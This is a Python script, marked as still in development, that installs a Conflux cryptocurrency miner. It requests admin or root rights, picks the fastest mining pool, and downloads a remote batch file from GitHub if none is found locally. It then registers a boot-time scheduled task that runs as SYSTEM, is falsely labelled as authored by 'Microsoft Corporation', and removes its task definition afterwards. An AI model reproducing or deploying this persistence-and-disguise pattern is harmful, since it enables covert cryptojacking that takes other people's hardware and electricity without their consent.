'''
This script is not working yet. Still in development.
'''
import os
import sys
import socket
import requests
from time import time

# Step 1: Check and request admin privileges
if os.name == 'nt':
    if os.environ.get('USERNAME') != 'Administrator':
        os.system('powershell -Command "Start-Process \'python\' -ArgumentList \'{}\' -Verb RunAs"'.format(' '.join(sys.argv)))
        sys.exit()
else:
    # For UNIX, Linux, macOS
    if os.getuid() != 0:
        print("Script not started as root. Running sudo..")
        os.system(f'sudo python {" ".join(sys.argv)}')
        sys.exit()

# Step 2: Set up mining pool addresses and other variables
mining_pool_addresses = [
    "stratum+tcp://de.conflux.herominers.com:1170",
    "stratum+tcp://fi.conflux.herominers.com:1170",
    "stratum+tcp://ru.conflux.herominers.com:1170",
    "stratum+tcp://ca.conflux.herominers.com:1170",
    "stratum+tcp://us.conflux.herominers.com:1170",
    "stratum+tcp://us2.conflux.herominers.com:1170",
    "stratum+tcp://br.conflux.herominers.com:1170",
    "stratum+tcp://hk.conflux.herominers.com:1170",
    "stratum+tcp://kr.conflux.herominers.com:1170",
    "stratum+tcp://in.conflux.herominers.com:1170",
    "stratum+tcp://sg.conflux.herominers.com:1170",
    "stratum+tcp://tr.conflux.herominers.com:1170",
    "stratum+tcp://au.conflux.herominers.com:1170",
]
lowest_latency = 100000
best_mining_pool = ""

# Step 3: Check latency for each mining pool and find the best one
for address in mining_pool_addresses:
    host, port = address.split('/')[2].split(':')
    start_time = time()
    
    try:
        socket.create_connection((host, int(port)), timeout=5)
        latency = round((time() - start_time) * 1000)  # Convert to milliseconds
    except (socket.gaierror, socket.timeout):
        latency = 100000  # Set a high latency value in case of error

    print(f"Latency to {address} is {latency} ms")

    if latency < lowest_latency:
        lowest_latency = latency
        best_mining_pool = address

# Step 4: Setup variables
trex_miner_setup_file = 'conflux_miner_setup.bat'
mining_pool_address = best_mining_pool
conflux_wallet_address = 'cfx:aanxwjsuf6e2yyntw1ecjyagrj24s9wvkjum1egd6m'
worker_name = 'worker1'
base_path = 'C:\\Users'

# Step 5: Find the setup file or download it if not found
download_url = 'https://raw.githubusercontent.com/FireNirva/useful-scripts/main/GPU/conflux_miner_setup.bat'
download_dir = os.path.join(base_path, 'AppData', 'Local', 'Temp')
os.makedirs(download_dir, exist_ok=True)
setup_file_path = ''

for root, dirs, files in os.walk(base_path):
    if trex_miner_setup_file in files:
        setup_file_path = os.path.join(root, trex_miner_setup_file)
        break

if not setup_file_path:
    setup_file_path = os.path.join(download_dir, trex_miner_setup_file)
    response = requests.get(download_url, stream=True)
    with open(setup_file_path, 'wb') as fd:
        for chunk in response.iter_content(chunk_size=8192):
            fd.write(chunk)

print(f"Setup file located at: {setup_file_path}")

# Step 6: Create and run a scheduled task using schtasks
task_name = "RunConfluxMinerSetup"
task_command = f'cmd.exe /C "{setup_file_path}" {mining_pool_address} {conflux_wallet_address} {worker_name}'
task_xml_content = f'''
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT10S</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>{task_command}</Command>
    </Exec>
  </Actions>
</Task>
'''

with open('TaskDefinition.xml', 'w') as f:
    f.write(task_xml_content)

os.system(f'schtasks /create /tn "{task_name}" /xml "TaskDefinition.xml"')
os.system(f'schtasks /run /tn "{task_name}"')
os.remove('TaskDefinition.xml')

print(f"Quickest mining pool is: \"{best_mining_pool}\" with a latency of {lowest_latency} ms")
